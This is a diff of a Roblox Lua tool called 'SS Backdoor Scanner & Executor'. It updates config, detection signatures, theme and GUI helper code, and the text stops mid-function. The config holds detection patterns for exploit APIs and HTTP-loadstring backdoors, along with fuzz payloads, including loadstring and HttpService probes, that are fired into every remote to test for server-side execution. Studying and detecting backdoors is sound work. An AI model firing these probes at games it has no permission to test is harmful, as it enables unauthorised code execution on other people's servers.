@@ -1,154 +1,111 @@
 --[[
     ╔══════════════════════════════════════════════════════════════════════╗
-    ║         SS Roblox Backdoor Scanner & Executor  v4.0  (2026)         ║
+    ║         SS Roblox Backdoor Scanner & Executor  v4.1  (2026)         ║
     ║                  Full GUI Edition  ·  LocalScript                   ║
     ╠══════════════════════════════════════════════════════════════════════╣
     ║  TABS: Scanner · Auto-Fuzzer · Executor · Console · Firewall · ⚙   ║
     ╠══════════════════════════════════════════════════════════════════════╣
-    ║  2026 DETECTION METHODS:                                            ║
+    ║  2026 detection methods:                                            ║
     ║  • Risk-score engine (0-100) per remote / script                    ║
-    ║  • Auto-Fuzzer: batch-fires ALL remotes, logs response + side fx    ║
-    ║  • G-Bridge probe: scans _G / shared / getgenv for exec functions   ║
+    ║  • Auto-Fuzzer — batch-fires ALL remotes, logs response + side fx   ║
+    ║  • G-Bridge probe — scans _G / shared / getgenv for exec funcs      ║
     ║  • require(AssetID) chain tracer in script source                   ║
     ║  • Instance Attribute scanning (hidden IDs & URLs)                  ║
     ║  • StringValue hidden-payload scanner                               ║
-    ║  • Obfuscation fingerprint: Luraph / Ironbrew / long-line / entropy ║
+    ║  • Obfuscation fingerprint: long-line / entropy / string.char       ║
     ║  • HTTP+loadstring chain detector                                   ║
-    ║  • hookfunction / newcclosure / rawset exploit-API detector         ║
+    ║  • hookfunction / newcclosure exploit-API detector                  ║
     ║  • Signature DB: 8 known backdoor family patterns                   ║
     ║  • Live DescendantAdded monitor across 12 services                  ║
     ║  • Firewall: absorb + detach suspicious remotes                     ║
-    ║  • Draggable, minimisable dark GUI with open/close animations       ║
     ╚══════════════════════════════════════════════════════════════════════╝
 --]]
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §1  SERVICES
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local Players          = game:GetService("Players")
 local TweenService     = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-local RunService       = game:GetService("RunService")
 
-local LP      = Players.LocalPlayer
-local PGui    = LP:WaitForChild("PlayerGui")
+local LP   = Players.LocalPlayer
+local PGui = LP:WaitForChild("PlayerGui")
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §2  CONFIG  +  SIGNATURE DATABASE
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local CFG = {
-    VERSION = "4.0.0",
+    VERSION = "4.1.0",
 
-    -- ── Remote name keyword heuristics ───────────────────────────────────
-    -- Covers classic names AND known 2024-2026 camouflage names from
-    -- leaked free-model backdoors (EffectManager, Vaccine, PoseTexture…)
+    -- Remote name heuristics — 2024-2026 backdoor / camouflage names
     BAD_NAMES = {
-        -- Explicit
         "backdoor","bd","cmd","exec","execute","run","eval","load","sys",
         "shell","admin_cmd","remote_exec","btools","kill","exploit","hack",
         "inject","bypass","script_exec","server_cmd","luaexec","loadscript",
         "remoteexploit","rce","getscript","remotecmd","execscript","obfexec",
-        -- 2024-2026 camouflage names (real leaked names)
         "vaccine","pose","skybox","effectmanager","effectbuilder",
         "coreskyboxsystem","posetexture","lightingscript","package",
         "coresystem","systemcore","util_core","datacore","netcore",
         "handler","dispatcher","resolver","connector","bridge","relay",
-        "trigger","signal","heartbeat","tick_mgr","frame_loop",
     },
 
-    -- ── Script source patterns ───────────────────────────────────────────
-    -- Searched inside Script/LocalScript/ModuleScript .Source
+    -- Script source patterns (searched inside .Source)
     SRC_PATTERNS = {
-        -- Critical RCE
-        { p="loadstring%s*%(",            l="loadstring()",          sev="CRIT",  w=45 },
-        { p="getgenv%s*%(",               l="getgenv()",             sev="CRIT",  w=40 },
-        { p="hookfunction",               l="hookfunction()",        sev="CRIT",  w=35 },
-        { p="newcclosure",                l="newcclosure()",         sev="CRIT",  w=30 },
-        { p="require%s*%(%s*%d+%s*%)",   l="require(AssetID)",      sev="CRIT",  w=40 },
-        -- HTTP-based C2
-        { p="GetAsync%s*%(",              l="GetAsync()",            sev="WARN",  w=20 },
-        { p="PostAsync%s*%(",             l="PostAsync()",           sev="WARN",  w=20 },
-        { p="game%.HttpGet",              l="game:HttpGet",          sev="WARN",  w=20 },
-        { p="HttpService",                l="HttpService ref",       sev="WARN",  w=10 },
-        -- Global table abuse
-        { p="_G%s*%[",                    l="_G[] write",            sev="WARN",  w=15 },
-        { p="shared%s*%[",               l="shared[] write",        sev="WARN",  w=15 },
-        -- Obfuscation fingerprints
-        { p="base64",                     l="base64 blob",           sev="WARN",  w=15 },
-        { p="string%.char%s*%(",          l="string.char() encode",  sev="WARN",  w=12 },
-        { p="string%.byte%s*%(",          l="string.byte() decode",  sev="WARN",  w=10 },
-        { p="tonumber%s*%(.+,%s*16",      l="hex decode",            sev="WARN",  w=12 },
-        -- Environment probing
-        { p="getfenv%s*%(",               l="getfenv()",             sev="WARN",  w=15 },
-        { p="setfenv%s*%(",               l="setfenv()",             sev="WARN",  w=15 },
-        { p="getmetatable%s*%(",          l="getmetatable()",        sev="INFO",  w=8  },
-        { p="rawset%s*%(",                l="rawset()",              sev="INFO",  w=5  },
-        -- Exploit filesystem APIs
-        { p="readfile",                   l="readfile()",            sev="WARN",  w=18 },
-        { p="writefile",                  l="writefile()",           sev="WARN",  w=18 },
-        { p="syn%.request",               l="syn.request()",         sev="CRIT",  w=35 },
-        { p="request%s*%(%s*{",           l="request() HTTP",        sev="CRIT",  w=30 },
-        -- General require
-        { p="require%s*%(",               l="require()",             sev="INFO",  w=5  },
+        { p="loadstring%s*%(", l="loadstring()",          sev="CRIT", w=45 },
+        { p="getgenv%s*%(",   l="getgenv()",             sev="CRIT", w=40 },
+        { p="hookfunction",   l="hookfunction()",        sev="CRIT", w=35 },
+        { p="newcclosure",    l="newcclosure()",         sev="CRIT", w=30 },
+        { p="require%s*%(%s*%d+%s*%)", l="require(AssetID)", sev="CRIT", w=40 },
+        { p="GetAsync%s*%(",  l="GetAsync()",            sev="WARN", w=20 },
+        { p="PostAsync%s*%(", l="PostAsync()",           sev="WARN", w=20 },
+        { p="game%.HttpGet",  l="game:HttpGet",          sev="WARN", w=20 },
+        { p="HttpService",    l="HttpService ref",       sev="WARN", w=10 },
+        { p="_G%s*%[",        l="_G[] write",            sev="WARN", w=15 },
+        { p="shared%s*%[",   l="shared[] write",        sev="WARN", w=15 },
+        { p="base64",         l="base64 blob",           sev="WARN", w=15 },
+        { p="string%.char%s*%(", l="string.char() encode", sev="WARN", w=12 },
+        { p="string%.byte%s*%(", l="string.byte() decode", sev="WARN", w=10 },
+        { p="tonumber%s*%(.+,%s*16", l="hex decode",    sev="WARN", w=12 },
+        { p="getfenv%s*%(",   l="getfenv()",            sev="WARN", w=15 },
+        { p="setfenv%s*%(",   l="setfenv()",            sev="WARN", w=15 },
+        { p="getmetatable%s*%(", l="getmetatable()",    sev="INFO", w=8  },
+        { p="rawset%s*%(",    l="rawset()",             sev="INFO", w=5  },
+        { p="readfile",       l="readfile()",           sev="WARN", w=18 },
+        { p="writefile",      l="writefile()",          sev="WARN", w=18 },
+        { p="syn%.request",   l="syn.request()",        sev="CRIT", w=35 },
+        { p="require%s*%(",   l="require()",            sev="INFO", w=5  },
     },
 
-    -- ── Known backdoor family signatures ─────────────────────────────────
-    -- Each entry defines a multi-condition match. If ALL conditions match
-    -- the source of a single script, the family name is flagged CRIT.
+    -- Known backdoor family signatures (all conditions must match same source)
     SIGNATURES = {
-        {
-            name = "HTTP-C2 Loadstring",
-            desc = "Fetches code via HTTP then executes with loadstring() — classic 2022-2026 C2 pattern",
-            conds = { "GetAsync%s*%(", "loadstring%s*%(" },
-            sev = "CRIT", risk = 80,
-        },
-        {
-            name = "Require-AssetID Dropper",
-            desc = "Calls require() with a hardcoded numeric asset ID — loads external module at runtime",
-            conds = { "require%s*%(%s*%d+" },
-            sev = "CRIT", risk = 75,
-        },
-        {
-            name = "_G Bridge Executor",
-            desc = "Writes a function into _G or shared table to expose server-side execution to any script",
-            conds = { "_G%s*%[", "function" },
-            sev = "CRIT", risk = 65,
-        },
-        {
-            name = "getgenv Injector",
-            desc = "Uses getgenv() to inject into the global exploit environment",
-            conds = { "getgenv%s*%(", "loadstring%s*%(" },
-            sev = "CRIT", risk = 70,
-        },
-        {
-            name = "Obfuscated Dropper (Luraph/IB)",
-            desc = "High-entropy string blob consistent with Luraph or Ironbrew obfuscation",
-            conds = { "string%.char%s*%(", "tonumber%s*%(.+,%s*16" },
-            sev = "CRIT", risk = 60,
-        },
-        {
-            name = "Function Hook Backdoor",
-            desc = "Uses hookfunction/newcclosure to intercept existing game functions",
-            conds = { "hookfunction", "newcclosure" },
-            sev = "CRIT", risk = 72,
-        },
-        {
-            name = "HTTP POST Exfil",
-            desc = "Sends data to an external server via PostAsync — possible data exfiltration",
-            conds = { "PostAsync%s*%(", "HttpService" },
-            sev = "WARN", risk = 55,
-        },
-        {
-            name = "Environment Takeover",
-            desc = "Combines setfenv/getfenv with loadstring to redefine script environment",
-            conds = { "setfenv%s*%(", "loadstring%s*%(" },
-            sev = "CRIT", risk = 68,
-        },
+        { name="HTTP-C2 Loadstring",
+          desc="Fetches code via HTTP then executes with loadstring()",
+          conds={"GetAsync%s*%(","loadstring%s*%("},       sev="CRIT", risk=80 },
+        { name="Require-AssetID Dropper",
+          desc="Calls require() with a hardcoded numeric AssetID",
+          conds={"require%s*%(%s*%d+"},                   sev="CRIT", risk=75 },
+        { name="_G Bridge Executor",
+          desc="Writes an execution function into _G",
+          conds={"_G%s*%[","function"},                   sev="CRIT", risk=65 },
+        { name="getgenv Injector",
+          desc="Uses getgenv() + loadstring to inject into exploit env",
+          conds={"getgenv%s*%(","loadstring%s*%("},        sev="CRIT", risk=70 },
+        { name="Obfuscated Dropper",
+          desc="string.char + hex decode pattern = Luraph/Ironbrew",
+          conds={"string%.char%s*%(","tonumber%s*%(.+,%s*16"}, sev="CRIT", risk=60 },
+        { name="Function Hook Backdoor",
+          desc="hookfunction+newcclosure intercepts game functions",
+          conds={"hookfunction","newcclosure"},             sev="CRIT", risk=72 },
+        { name="HTTP POST Exfil",
+          desc="Sends data to an external server — possible exfiltration",
+          conds={"PostAsync%s*%(","HttpService"},          sev="WARN", risk=55 },
+        { name="Environment Takeover",
+          desc="setfenv+loadstring redefines the script environment",
+          conds={"setfenv%s*%(","loadstring%s*%("},        sev="CRIT", risk=68 },
     },
 
-    -- ── Services to scan ─────────────────────────────────────────────────
     SERVICES = {
         "Workspace","ReplicatedStorage","ReplicatedFirst",
         "ServerStorage","ServerScriptService","StarterGui",
@@ -156,273 +113,427 @@ local CFG = {
         "SoundService","Chat",
     },
 
-    -- ── Auto-fuzzer payload sets ──────────────────────────────────────────
-    -- QUICK: fast non-destructive probe
-    -- DEEP:  includes loadstring and HTTP probes
     FUZZ_SETS = {
         QUICK = {
             'print("[SS-FUZZ] ping @ "..tostring(tick()))',
-            "nil",
-            "true",
-            "1337",
-            "{}",
+            "nil", "true", "1337", "{}",
         },
         DEEP = {
             'print("[SS-FUZZ] deep probe @ "..tostring(tick()))',
-            'loadstring("print(\'[SS-FUZZ] loadstring active\')")()',
-            'pcall(function() local h=game:GetService("HttpService"); print(h:GetAsync("https://httpbin.org/get"):sub(1,80)) end)',
+            'loadstring and loadstring("print(\'[SS-FUZZ] loadstring active\')")()',
             'for k,v in pairs(_G) do print("_G",k,type(v)) end',
             'for k,v in pairs(shared) do print("shared",k,type(v)) end',
+            'pcall(function() local h=game:GetService("HttpService"); print(h:GetAsync("https://httpbin.org/ip"):sub(1,60)) end)',
         },
     },
 
-    -- ── G-Bridge probe keys ───────────────────────────────────────────────
-    -- These _G / shared keys indicate a live execution bridge
     GBRIDGE_KEYS = {
         "exec","execute","run","eval","load","cmd","shell","backdoor","bd",
         "rce","exploit","hack","inject","fire","trigger","callback","dispatch",
     },
 
-    -- Options
-    SCAN_SCRIPTS       = true,
-    SCAN_ATTRS         = true,
-    SCAN_STRVALS       = true,
-    SCAN_OBFUSCATION   = true,
-    SCAN_GBRIDGE       = true,
-    VERBOSE            = true,
-    FIREWALL_MODE      = false,
-    LIVE_MONITOR       = true,
-    MAX_EXEC_HISTORY   = 15,
-    INVOKE_TIMEOUT     = 5,
-    ENTROPY_LINE_LEN   = 280,
+    SCAN_SCRIPTS    = true,
+    SCAN_ATTRS      = true,
+    SCAN_STRVALS    = true,
+    SCAN_OBFUSCATE  = true,
+    SCAN_GBRIDGE    = true,
+    VERBOSE         = true,
+    FIREWALL_MODE   = false,
+    LIVE_MONITOR    = true,
+    MAX_EXEC_HIST   = 15,
+    INVOKE_TIMEOUT  = 5,
+    ENTROPY_LINE    = 280,
 }
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §3  THEME
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local T = {
-    BG0  = Color3.fromRGB(10,  10,  15 ),   -- deepest bg
-    BG1  = Color3.fromRGB(16,  16,  23 ),   -- primary bg
-    BG2  = Color3.fromRGB(22,  22,  33 ),   -- secondary bg
-    BG3  = Color3.fromRGB(30,  30,  45 ),   -- tertiary bg
-    HOV  = Color3.fromRGB(40,  40,  58 ),   -- hover bg
-    ACC  = Color3.fromRGB(99,  102, 241),   -- primary accent (indigo)
-    ACC2 = Color3.fromRGB(55,  58,  145),   -- dimmed accent
-    CRIT = Color3.fromRGB(239, 68,  68 ),   -- red
-    WARN = Color3.fromRGB(234, 179, 8  ),   -- yellow
-    OK   = Color3.fromRGB(34,  197, 94 ),   -- green
-    INFO = Color3.fromRGB(99,  102, 241),   -- blue/indigo
-    PRP  = Color3.fromRGB(168, 85,  247),   -- purple (attribute findings)
-    TXT  = Color3.fromRGB(238, 238, 255),   -- primary text
-    TXS  = Color3.fromRGB(155, 155, 190),   -- secondary text
-    TXM  = Color3.fromRGB(85,  85,  115),   -- muted text
-    BDR  = Color3.fromRGB(40,  40,  60 ),   -- border
-    SCR  = Color3.fromRGB(55,  55,  78 ),   -- scrollbar
-    BRED = Color3.fromRGB(175, 25,  25 ),   -- button red
-    BGRN = Color3.fromRGB(20,  115, 55 ),   -- button green
-    BBLU = Color3.fromRGB(28,  75,  210),   -- button blue
-    BORA = Color3.fromRGB(170, 90,  12 ),   -- button orange
-    BPUR = Color3.fromRGB(120, 40,  200),   -- button purple
-    TTL  = Color3.fromRGB(13,  13,  20 ),   -- title bar
-    TABON= Color3.fromRGB(99,  102, 241),   -- active tab
-    TABOF= Color3.fromRGB(28,  28,  42 ),   -- inactive tab
-    -- Risk score gradient colours
-    R0   = Color3.fromRGB(34,  197, 94 ),   -- risk 0-24  (safe)
-    R25  = Color3.fromRGB(234, 179, 8  ),   -- risk 25-49 (low)
-    R50  = Color3.fromRGB(249, 115, 22 ),   -- risk 50-74 (medium)
-    R75  = Color3.fromRGB(239, 68,  68 ),   -- risk 75-100 (critical)
+    BG0  = Color3.fromRGB(10,  10,  15 ),
+    BG1  = Color3.fromRGB(16,  16,  23 ),
+    BG2  = Color3.fromRGB(22,  22,  33 ),
+    BG3  = Color3.fromRGB(30,  30,  45 ),
+    HOV  = Color3.fromRGB(40,  40,  58 ),
+    ACC  = Color3.fromRGB(99,  102, 241),
+    ACC2 = Color3.fromRGB(55,  58,  145),
+    CRIT = Color3.fromRGB(239, 68,  68 ),
+    WARN = Color3.fromRGB(234, 179, 8  ),
+    OK   = Color3.fromRGB(34,  197, 94 ),
+    INFO = Color3.fromRGB(99,  102, 241),
+    PRP  = Color3.fromRGB(168, 85,  247),
+    TXT  = Color3.fromRGB(238, 238, 255),
+    TXS  = Color3.fromRGB(155, 155, 190),
+    TXM  = Color3.fromRGB(85,  85,  115),
+    BDR  = Color3.fromRGB(40,  40,  60 ),
+    SCR  = Color3.fromRGB(55,  55,  78 ),
+    BRED = Color3.fromRGB(175, 25,  25 ),
+    BGRN = Color3.fromRGB(20,  115, 55 ),
+    BBLU = Color3.fromRGB(28,  75,  210),
+    BORA = Color3.fromRGB(170, 90,  12 ),
+    BPUR = Color3.fromRGB(120, 40,  200),
+    TTL  = Color3.fromRGB(13,  13,  20 ),
+    TABON= Color3.fromRGB(99,  102, 241),
+    TABOF= Color3.fromRGB(28,  28,  42 ),
 }
 
 local function riskColor(score)
-    if score >= 75 then return T.R75
-    elseif score >= 50 then return T.R50
-    elseif score >= 25 then return T.R25
-    else return T.R0 end
+    if score >= 75 then return Color3.fromRGB(239,68,68)
+    elseif score >= 50 then return Color3.fromRGB(249,115,22)
+    elseif score >= 25 then return Color3.fromRGB(234,179,8)
+    else return Color3.fromRGB(34,197,94) end
 end
 
-local function riskLabel(score)
-    if score >= 75 then return "CRITICAL"
-    elseif score >= 50 then return "HIGH"
-    elseif score >= 25 then return "MEDIUM"
-    else return "LOW" end
-end
-
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §4  STATE
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
 local S = {
-    -- Scan results
-    remotes      = {},   -- { inst, svc, path, class, risk, keyword, fuzzed }
-    scripts      = {},   -- { inst, path, flags, signatures, risk }
-    attrFinds    = {},   -- { inst, path, findings, risk }
-    strvalFinds  = {},   -- { inst, path, findings }
-    gbridgeFinds = {},   -- { key, val, source }
-    -- Fuzzer
-    fuzzQueue    = {},   -- entries from S.remotes
-    fuzzResults  = {},   -- { path, payload, response, ok, riskDelta }
-    isFuzzing    = false,
-    -- Executor
+    remotes      = {},
+    scripts      = {},
+    attrFinds    = {},
+    strvalFinds  = {},
+    gbridgeFinds = {},
+    fuzzQueue    = {},
+    fuzzResults  = {},
+    firewalled   = {},
     execHistory  = {},
+    monConns     = {},
+    isFuzzing    = false,
+    isScanning   = false,
     selRemote    = nil,
     fireMode     = "FireServer",
-    -- Monitor
-    monConns     = {},
-    -- UI flags
-    isScanning   = false,
     minimised    = false,
-    activeTab    = "Scanner",
 }
 
--- Forward-declared UI refs (filled during GUI construction)
+-- Forward-declared UI references (assigned during GUI construction below)
 local ConsoleList, ResultsList, FuzzResultList, FuzzQueueList
 local HistList, FWList, ProgressFill, ProgressLabel
+local TargetBox, PayloadBox, ExecResultLabel, GBridgeList
 local statLabels, tabButtons, tabFrames = {}, {}, {}
-local TargetBox, PayloadBox, ExecResultLabel
-local GBridgeList
+local bScan -- forward-declare scan button so scanner logic can reference it
 
--- ════════════════════════════════════════════════════════════════════════
--- §5  LOGGING
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
+-- §5  LOGGING  (NOTE: does NOT shadow the 'makeLabel' helper below)
+-- ═══════════════════════════════════════════════════════════════════════
 
-local function ts() local t=os.date("*t"); return ("%02d:%02d:%02d"):format(t.hour,t.min,t.sec) end
+local function ts()
+    local t = os.date("*t")
+    return ("%02d:%02d:%02d"):format(t.hour, t.min, t.sec)
+end
 
-local LC = { INFO=T.INFO, WARN=T.WARN, CRIT=T.CRIT, OK=T.OK, EXEC=T.ACC, SYS=T.TXS, FUZZ=T.PRP }
+local LOG_COLORS = {
+    INFO=Color3.fromRGB(99,102,241), WARN=Color3.fromRGB(234,179,8),
+    CRIT=Color3.fromRGB(239,68,68),  OK  =Color3.fromRGB(34,197,94),
+    EXEC=Color3.fromRGB(99,102,241), SYS =Color3.fromRGB(155,155,190),
+    FUZZ=Color3.fromRGB(168,85,247),
+}
 
 local function log(level, msg)
     msg = tostring(msg)
-    local color = LC[level] or T.TXT
     print(("[SSv4][%s][%s] %s"):format(ts(), level, msg))
     if not ConsoleList then return end
+    local color = LOG_COLORS[level] or Color3.fromRGB(238,238,255)
     local row = Instance.new("Frame")
     row.Size = UDim2.new(1,-8,0,17)
     row.BackgroundTransparency = 1
-    row.LayoutOrder = #S + 1
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1,0,1,0)
-    lbl.BackgroundTransparency = 1
-    lbl.TextColor3 = color
-    lbl.Font = Enum.Font.Code
-    lbl.TextSize = 11
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Text = ("[%s][%s] %s"):format(ts(), level, msg)
-    lbl.TextTruncate = Enum.TextTruncate.AtEnd
-    lbl.Parent = row
     row.Parent = ConsoleList
+    local entry = Instance.new("TextLabel")   -- NOTE: named 'entry', NOT 'lbl'
+    entry.Size = UDim2.new(1,0,1,0)
+    entry.BackgroundTransparency = 1
+    entry.TextColor3 = color
+    entry.Font = Enum.Font.Code
+    entry.TextSize = 11
+    entry.TextXAlignment = Enum.TextXAlignment.Left
+    entry.TextTruncate = Enum.TextTruncate.AtEnd
+    entry.Text = ("[%s][%s] %s"):format(ts(), level, msg)
+    entry.Parent = row
     task.defer(function()
-        local sf = ConsoleList.Parent
-        if sf and sf:IsA("ScrollingFrame") then sf.CanvasPosition = Vector2.new(0,math.huge) end
+        local scr = ConsoleList.Parent
+        if scr and scr:IsA("ScrollingFrame") then
+            scr.CanvasPosition = Vector2.new(0, math.huge)
+        end
     end)
 end
 
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 -- §6  GUI UTILITIES
--- ════════════════════════════════════════════════════════════════════════
+-- ═══════════════════════════════════════════════════════════════════════
 
-local function corner(i, r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 6); c.Parent=i; return c end
-local function stroke(i,col,th) local s=Instance.new("UIStroke"); s.Color=col or T.BDR; s.Thickness=th or 1; s.Parent=i; return s end
-local function pad(i,t,r,b,l) local p=Instance.new("UIPadding"); p.PaddingTop=UDim.new(0,t or 6); p.PaddingRight=UDim.new(0,r or 6); p.PaddingBottom=UDim.new(0,b or 6); p.PaddingLeft=UDim.new(0,l or 6); p.Parent=i; return p end
-local function ll(i,gap,dir,ha) local l=Instance.new("UIListLayout"); l.Padding=UDim.new(0,gap or 4); l.FillDirection=dir or Enum.FillDirection.Vertical; l.HorizontalAlignment=ha or Enum.HorizontalAlignment.Left; l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=i; return l end
-local function lbl(p,txt,sz,col,fnt,xa)
-    local l=Instance.new("TextLabel"); l.BackgroundTransparency=1; l.Text=txt or ""; l.TextSize=sz or 13
-    l.TextColor3=col or T.TXT; l.Font=fnt or Enum.Font.GothamBold; l.TextXAlignment=xa or Enum.TextXAlignment.Left
-    l.TextTruncate=Enum.TextTruncate.AtEnd; l.Parent=p; return l
-end
-local function sf(p,sz,pos)
-    local s=Instance.new("ScrollingFrame"); s.Size=sz or UDim2.new(1,0,1,0); if pos then s.Position=pos end
-    s.BackgroundTransparency=1; s.BorderSizePixel=0; s.ScrollBarThickness=5; s.ScrollBarImageColor3=T.SCR
-    s.CanvasSize=UDim2.new(0,0,0,0); s.AutomaticCanvasSize=Enum.AutomaticSize.Y; s.Parent=p; return s
-end
-local function sep(p)
-    local f=Instance.new("Frame"); f.Size=UDim2.new(1,-12,0,1); f.BackgroundColor3=T.BDR; f.BorderSizePixel=0; f.Parent=p; return f
+local function mkCorner(i, r)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, r or 6)
+    c.Parent = i
 end
 
-local function btn(p, txt, bg, fg, sz, pos)
+local function mkStroke(i, col, th)
+    local s = Instance.new("UIStroke")
+    s.Color = col or T.BDR
+    s.Thickness = th or 1
+    s.Parent = i
+end
+
+local function mkPad(i, t, r, b, l)
+    local p = Instance.new("UIPadding")
+    p.PaddingTop    = UDim.new(0, t or 6)
+    p.PaddingRight  = UDim.new(0, r or 6)
+    p.PaddingBottom = UDim.new(0, b or 6)
+    p.PaddingLeft   = UDim.new(0, l or 6)
+    p.Parent = i
+end
+
+local function mkList(i, gap, dir, ha)
+    local l = Instance.new("UIListLayout")
+    l.Padding = UDim.new(0, gap or 4)
+    l.FillDirection = dir or Enum.FillDirection.Vertical
+    l.HorizontalAlignment = ha or Enum.HorizontalAlignment.Left
+    l.SortOrder = Enum.SortOrder.LayoutOrder
+    l.Parent = i
+end
+
+local function mkSep(p)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1,-12,0,1)
+    f.BackgroundColor3 = T.BDR
+    f.BorderSizePixel = 0
+    f.Parent = p
+    return f
+end
+
+-- mkLbl — primary label helper (never shadows itself)
+local function mkLbl(parent, text, size, color, font, xa)
+    local l = Instance.new("TextLabel")
+    l.BackgroundTransparency = 1
+    l.Text = text or ""
+    l.TextSize = size or 13
+    l.TextColor3 = color or T.TXT
+    l.Font = font or Enum.Font.GothamBold
+    l.TextXAlignment = xa or Enum.TextXAlignment.Left
+    l.TextTruncate = Enum.TextTruncate.AtEnd
+    l.Parent = parent
+    return l
+end
+
+local function mkSF(parent, sz, pos)
+    local s = Instance.new("ScrollingFrame")
+    s.Size = sz or UDim2.new(1,0,1,0)
+    if pos then s.Position = pos end
+    s.BackgroundTransparency = 1
+    s.BorderSizePixel = 0
+    s.ScrollBarThickness = 5
+    s.ScrollBarImageColor3 = T.SCR
+    s.CanvasSize = UDim2.new(0,0,0,0)
+    s.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    s.Parent = parent
+    return s
+end
+
+-- mkBtn — button with safe hover tween (no Color3 arithmetic overflow)
+local function mkBtn(parent, text, bgColor, fgColor, sz, pos)
     local b = Instance.new("TextButton")
-    b.Size = sz or UDim2.new(0,100,0,30); if pos then b.Position=pos end
-    b.BackgroundColor3 = bg or T.ACC; b.TextColor3 = fg or T.TXT
-    b.Font = Enum.Font.GothamBold; b.TextSize = 12; b.Text = txt or ""
-    b.AutoButtonColor = false; b.BorderSizePixel = 0; b.Parent = p; corner(b, 6)
-    local base = bg
-    b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=Color3.new(math.min(base.R+0.09,1),math.min(base.G+0.09,1),math.min(base.B+0.09,1))}):Play() end)
-    b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=base}):Play() end)
-    b.MouseButton1Down:Connect(function() TweenService:Create(b,TweenInfo.new(0.06),{BackgroundColor3=Color3.new(math.max(base.R-0.09,0),math.max(base.G-0.09,0),math.max(base.B-0.09,0))}):Play() end)
-    b.MouseButton1Up:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=base}):Play() end)
+    b.Size = sz or UDim2.new(0,100,0,30)
+    if pos then b.Position = pos end
+    b.BackgroundColor3 = bgColor or T.ACC
+    b.TextColor3 = fgColor or T.TXT
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.Text = text or ""
+    b.AutoButtonColor = false
+    b.BorderSizePixel = 0
+    b.Parent = parent
+    mkCorner(b, 6)
+    local base = bgColor or T.ACC
+    local hov = Color3.new(
+        math.min(base.R * 1.25, 1),
+        math.min(base.G * 1.25, 1),
+        math.min(base.B * 1.25, 1)
+    )
+    local dim = Color3.new(base.R * 0.75, base.G * 0.75, base.B * 0.75)
+    b.MouseEnter:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=hov}):Play()
+    end)
+    b.MouseLeave:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=base}):Play()
+    end)
+    b.MouseButton1Down:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.06), {BackgroundColor3=dim}):Play()
+    end)
+    b.MouseButton1Up:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=base}):Play()
+    end)
     return b
 end
 
-local function toggle(p, labelTxt, init, onChange)
-    local ctr = Instance.new("Frame"); ctr.Size=UDim2.new(1,0,0,28); ctr.BackgroundTransparency=1; ctr.Parent=p
-    local l = lbl(ctr, labelTxt, 12, T.TXT, Enum.Font.Gotham); l.Size=UDim2.new(1,-54,1,0)
-    local track = Instance.new("Frame"); track.Size=UDim2.new(0,44,0,22); track.Position=UDim2.new(1,-44,0.5,-11)
-    track.BackgroundColor3=init and T.ACC or T.BG3; track.Parent=ctr; corner(track,11); stroke(track,T.BDR)
-    local knob = Instance.new("Frame"); knob.Size=UDim2.new(0,16,0,16)
-    knob.Position=init and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
-    knob.BackgroundColor3=T.TXT; knob.Parent=track; corner(knob,8)
-    local state=init
-    local hb=Instance.new("TextButton"); hb.Size=UDim2.new(1,0,1,0); hb.BackgroundTransparency=1; hb.Text=""; hb.Parent=ctr
-    hb.MouseButton1Click:Connect(function()
-        state=not state
-        TweenService:Create(track,TweenInfo.new(0.18),{BackgroundColor3=state and T.ACC or T.BG3}):Play()
-        TweenService:Create(knob,TweenInfo.new(0.18),{Position=state and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)}):Play()
+-- mkToggle — toggle switch widget
+local function mkToggle(parent, labelText, initState, onChange)
+    local ctr = Instance.new("Frame")
+    ctr.Size = UDim2.new(1,0,0,28)
+    ctr.BackgroundTransparency = 1
+    ctr.Parent = parent
+
+    local lText = mkLbl(ctr, labelText, 12, T.TXT, Enum.Font.Gotham)
+    lText.Size = UDim2.new(1,-56,1,0)
+
+    local track = Instance.new("Frame")
+    track.Size = UDim2.new(0,44,0,22)
+    track.Position = UDim2.new(1,-44,0.5,-11)
+    track.BackgroundColor3 = initState and T.ACC or T.BG3
+    track.Parent = ctr
+    mkCorner(track, 11)
+    mkStroke(track, T.BDR)
+
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.new(0,16,0,16)
+    knob.Position = initState and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
+    knob.BackgroundColor3 = T.TXT
+    knob.Parent = track
+    mkCorner(knob, 8)
+
+    local state = initState
